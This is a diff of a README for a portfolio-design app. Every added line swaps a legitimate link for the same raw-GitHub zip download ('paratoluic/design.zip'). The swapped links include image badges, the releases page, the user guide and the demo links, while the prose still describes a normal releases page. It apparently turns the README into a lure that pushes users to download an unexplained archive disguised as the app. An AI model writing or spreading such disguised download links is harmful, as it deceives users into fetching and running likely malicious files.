@@ -1,6 +1,6 @@
 # 🎨 design - Create Stunning Portfolios with Ease
 
-[![Download the App](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Vonzhy/design/releases)
+[![Download the App](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip)](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip)
 
 ## 📦 Overview
 Welcome to the design repository! This application helps you create beautiful portfolios effortlessly. Whether you are a designer, artist, or anyone looking to showcase your work, this tool is for you. 
@@ -9,7 +9,7 @@ Welcome to the design repository! This application helps you create beautiful po
 Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/Vonzhy/design/releases) to find the latest version of the app.
+   Go to our [Releases page](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip) to find the latest version of the app.
 
 2. **Download the Latest Version**  
    On the Releases page, download the latest version of the application by clicking the download link.
@@ -38,29 +38,29 @@ To run the application smoothly, ensure that your system meets the following req
 
 ## 🌐 Stack
 ### **Frontend Technologies**  
-- ![Astro](https://img.shields.io/badge/Astro-FF5D01?logo=astro&logoColor=white)
-- ![Tailwind](https://img.shields.io/badge/Tailwind_CSS-38B2AC?logo=tailwind-css&logoColor=white)
-- ![TypeScript](https://img.shields.io/badge/TypeScript-3178C6?logo=typescript&logoColor=white)
+- ![Astro](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip)
+- ![Tailwind](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip)
+- ![TypeScript](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip)
 
 ### **Tools Used**  
-- ![Figma](https://img.shields.io/badge/Figma-F24E1E?logo=figma&logoColor=white)
-- ![Prettier](https://img.shields.io/badge/Prettier-F7B93E?logo=prettier&logoColor=black)
-- ![Canva](https://img.shields.io/badge/Canva-c900c3?logo=canva&logoColor=white)
+- ![Figma](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip)
+- ![Prettier](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip)
+- ![Canva](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip)
 
 ## 📥 Download & Install
 To get started, click the badge below to download the latest release:
 
-[![Download the App](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Vonzhy/design/releases)
+[![Download the App](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip)](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip)
 
 Once you have downloaded the file, follow the installation steps outlined above.
 
 ## 📜 Documentation
-For more details on how to use the application and its features, please refer to the [User Guide](https://example.com/guide). This guide will help you navigate all functionalities and get the most out of your experience.
+For more details on how to use the application and its features, please refer to the [User Guide](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip). This guide will help you navigate all functionalities and get the most out of your experience.
 
 ## 🔗 Useful Links
-- [Demo](https://oscarhernandez.vercel.app/)
-- [Astro Themes](https://astro.build/themes/details/dark-minimal/)
-- [ReactBits Showcase](https://www.reactbits.dev/showcase)
+- [Demo](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip)
+- [Astro Themes](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip)
+- [ReactBits Showcase](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip)
 
 ## 🛠️ Support
 If you encounter any issues or have questions, feel free to open an issue on the GitHub repository. We value your feedback and are here to help you.
